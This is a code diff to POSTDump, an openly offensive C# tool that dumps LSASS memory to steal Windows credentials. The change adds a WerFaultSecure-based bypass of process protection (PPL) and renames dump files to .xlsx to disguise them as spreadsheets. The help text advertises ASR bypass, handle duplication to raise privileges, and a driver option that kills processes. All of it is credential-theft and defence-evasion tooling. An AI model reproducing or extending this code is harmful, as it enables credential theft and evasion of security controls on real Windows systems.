@@ -5,7 +5,7 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using Data = POSTMiniDump.Data;
 using MinidumpUtils = POSTMiniDump.Utils;
-using System.IO;
+using Minidump;
 
 namespace POSTDump
 {
@@ -20,26 +20,31 @@ namespace POSTDump
         static void Help()
         {
             Console.WriteLine(@"" +
-                "--encrypt, -e - Encrypt dump in-memory\n" +
-                "--signature, -s - Generate invalid Minidump signature\n" +
-                "--outfile, -o - Output file where to write dump\n" +
+                "[PPL DISABLED]\n" +
                 "--snap - Use snapshot technic\n" +
                 "--fork - Use fork technic [default]\n" +
                 "--duplicate-elevate - Look for existing lsass handle to duplicate and elevate\n" +
-                "--elevate-handle - Open a handle to LSASS with low privileges and duplicate it to gain higher privileges\n" +
-                "--live - Parse creds from memory without writing into file on disk\n" +
-                "--fromfile - Parse creds from dump file\n" + 
-                "--asr - Attempt LSASS dump using ASR bypass (no signature/encrypt available)\n" +
+                "--elevate-handle - Open a handle with low privileges and duplicate it to gain higher privileges (default: true)\n" +
+                "--asr - Attempt dump using ASR bypass (no signature/encrypt available, .dmp file written on disk)\n" +
+                "[PPL ENABLED]\n" +
+                 "--duplicate-elevate - Look for existing lsass handle to duplicate and elevate\n" +
+                "--werfaultsecure - Attempt dump using vulnerable werfaultsecure to dump PPL process\n" +
                 "--driver, -d - Use Process Explorer driver to open lsass handle and dump lsass\n" +
                 "--kill, -k [processID] - Use Process Explorer driver to kill process and exit\n" +
-                "--help, -h - Display help" +
+                "[GLOBAL]\n" +
+                "--help, -h - Display help\n" +
+                "--encrypt, -e - Encrypt dump in-memory\n" +
+                "--signature, -s - Generate invalid Minidump signature\n" +
+                "--live - Parse creds from memory without writing into file on disk\n" +
+                "--parse-dump - Parse creds from dump file\n" +
+                "--outfile, -o - Output file where to write dump\n" +
                 "");
             return;
         }
       
         static void Main(string[] args) {
 
-            string filename = System.Environment.MachineName + "_" + DateTime.Now.ToString("ddMMyyyy_HH-mm") + ".dmp";
+            string filename = System.Environment.MachineName + "_" + DateTime.Now.ToString("ddMMyyyy_HH-mm") + ".xlsx";
             bool Encrypt = false;
             bool Signature = false;
             bool Elevate = false;
@@ -52,6 +57,7 @@ namespace POSTDump
             string Output = string.Empty;
             int processid = 0;
             string tech = "snapshot";
+            bool isWerfaultSecure = false;
 
             foreach (string arg in args)
             {
@@ -98,11 +104,15 @@ namespace POSTDump
                 {
                     Asr = true;
                 }
+                if (arg.Equals("--werfaultsecure"))
+                {
+                    isWerfaultSecure = true;
+                }
                 if (arg.Equals("--live"))
                 {
                     Live = true;
                 }
-                if (arg.Equals("--fromfile"))
+                if (arg.Equals("--parse-dump"))
                 {
                     fromfile = true;
                     int i = Array.IndexOf(args, arg);
@@ -145,7 +155,7 @@ namespace POSTDump
             if (fromfile)
             {
                 Console.WriteLine("Parsing file " + FileToParse);
-                Minidump.Program.Main(dc.BaseAddress, dc.rva, FileToParse);
+                Parser.Main(dc.BaseAddress, dc.rva, FileToParse);
                 return;
             }
 
@@ -167,6 +177,15 @@ namespace POSTDump
                     Driver.Kill(processid, out dc.hProcess, false);
                     return;
                 }
+            }
+
+            if (isWerfaultSecure)
+            {
+                if (!WerfaultSecure.Dump(pid, Output))
+                    return;
+
+                successDump = true;
+                Signature = true;
             }
 
             if (driver)
@@ -309,11 +328,11 @@ namespace POSTDump
             if (Live)
             {
                 Console.WriteLine($"Parsing from memory..");
-                Minidump.Program.Main(dc.BaseAddress, dc.rva);
+                Parser.Main(dc.BaseAddress, dc.rva);
             }
             else
             {
-                var success = MinidumpUtils.WriteFile(Output, dc.BaseAddress, dc.rva, out IntPtr hFile);
+                var success = MinidumpUtils.WriteFile(Output, dc.BaseAddress, dc.rva);
                 if (success)
                 {
                     Console.WriteLine($"Dump saved to {Output}");
